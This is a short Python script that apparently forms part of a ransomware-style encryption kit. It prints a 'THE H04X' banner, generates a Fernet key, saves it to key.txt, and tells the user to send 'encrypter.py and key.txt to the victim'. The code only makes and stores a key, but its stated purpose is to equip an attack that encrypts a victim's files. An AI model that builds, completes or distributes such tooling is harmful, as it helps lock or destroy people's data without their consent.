from cryptography.fernet import Fernet
from termcolor import colored
key = Fernet.generate_key()

print(colored(r'''
    --------- |     | 0000000    /\    /\     0000   000000000000000000000000000000000000000000000000000000
        |     |_____| 0     0   /  \  /  \   0    0  0                       0000000     0000      00000000
        |     |     | 0     0  /    \/    \  000000  0000000                 0          0    0        0
        |     |     | 0000000 /            \ 0    0         0      \ THE /   0          000000        0
        |                    /              \               0        ___     0000000    0    0        0
        | 000000000000000000000000000000000000000000000000000                                         0
        |                                                                                             0
                                                        
                                               --- THE H04X
'''
  ,"red",attrs=["underline"]))


with open('key.txt', 'wb') as f :
    f.write(key)

print("key was generated and stored in the key in txt send the encrypter.py and key.txt to the victim.....\n\n")
